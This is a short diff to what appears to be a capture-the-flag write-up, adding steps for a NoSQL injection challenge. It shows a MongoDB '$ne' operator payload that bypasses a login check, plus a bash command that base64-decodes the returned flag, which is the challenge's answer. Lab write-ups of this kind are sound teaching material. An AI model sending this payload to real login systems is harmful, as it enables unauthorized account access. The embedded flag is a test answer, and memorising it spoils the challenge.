@@ -21,3 +21,12 @@ and we need to get payload JSON data to exploit
 
     {"username": {"$ne": null}, "password": {"$ne": null}}
 
+and when we enter input the server is sending back flag but is in base64 encode foramt 
+<img width="1599" height="865" alt="3" src="https://github.com/user-attachments/assets/6c9e6407-646d-41ba-aed6-cd56948786d1" />
+and to do  decode we use this bash command
+
+    echo -n "YWNhZGVteXtqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzVkMzY4MGUwfQ==" | base64 -d
+
+<img width="1599" height="864" alt="5" src="https://github.com/user-attachments/assets/74d46202-c714-452f-8717-7a650a80c24c" />
+get our flag!
+
